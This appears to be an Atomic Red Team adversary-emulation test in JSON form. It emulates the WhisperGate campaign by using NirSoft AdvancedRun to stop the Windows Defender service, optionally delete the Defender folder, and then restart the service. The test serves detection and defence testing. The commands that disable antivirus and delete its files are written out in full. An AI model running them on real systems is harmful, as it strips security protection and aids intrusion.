{
  "id": "81ce22fd-9612-4154-918e-8a1f285d214d",
  "name": "Disable Defender Using NirSoft AdvancedRun",
  "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "4d775e3a-9af2-4254-b0a0-ab409b4a0d57",
      "type": "execute-command",
      "data": {
        "command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "e71d28e1-b8c4-4c86-a171-bbcd0ca23425",
      "type": "execute-command",
      "data": {
        "command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "dbda49b6-8949-4616-bd79-b57675385f90",
      "name": "Check dependency 1/1",
      "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
      "type": "execute-command",
      "data": {
        "command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "32f6f08c-61a6-4fe8-85e1-4ddac82c1897",
      "name": "Resolve dependency 1/1",
      "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "87355125-9a60-44f4-b44d-3fa65b14a56a",
      "name": "Re-check dependency 1/1",
      "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
      "type": "execute-command",
      "data": {
        "command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "4d775e3a-9af2-4254-b0a0-ab409b4a0d57",
      "p": "on-success",
      "o": "e71d28e1-b8c4-4c86-a171-bbcd0ca23425"
    },
    {
      "s": "4d775e3a-9af2-4254-b0a0-ab409b4a0d57",
      "p": "on-failure",
      "o": "e71d28e1-b8c4-4c86-a171-bbcd0ca23425"
    },
    {
      "s": "dbda49b6-8949-4616-bd79-b57675385f90",
      "p": "on-success",
      "o": "4d775e3a-9af2-4254-b0a0-ab409b4a0d57"
    },
    {
      "s": "dbda49b6-8949-4616-bd79-b57675385f90",
      "p": "on-failure",
      "o": "32f6f08c-61a6-4fe8-85e1-4ddac82c1897"
    },
    {
      "s": "32f6f08c-61a6-4fe8-85e1-4ddac82c1897",
      "p": "on-success",
      "o": "87355125-9a60-44f4-b44d-3fa65b14a56a"
    },
    {
      "s": "87355125-9a60-44f4-b44d-3fa65b14a56a",
      "p": "on-failure",
      "o": "4d775e3a-9af2-4254-b0a0-ab409b4a0d57"
    }
  ],
  "tags": [
    "T1562.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "AdvancedRun_Location",
      "type": "path",
      "description": "Path of Advanced Run executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
    },
    {
      "name": "delete_defender_folder",
      "type": "integer",
      "description": "Set to 1 to also delete the Windows Defender folder",
      "value": "0"
    }
  ]
}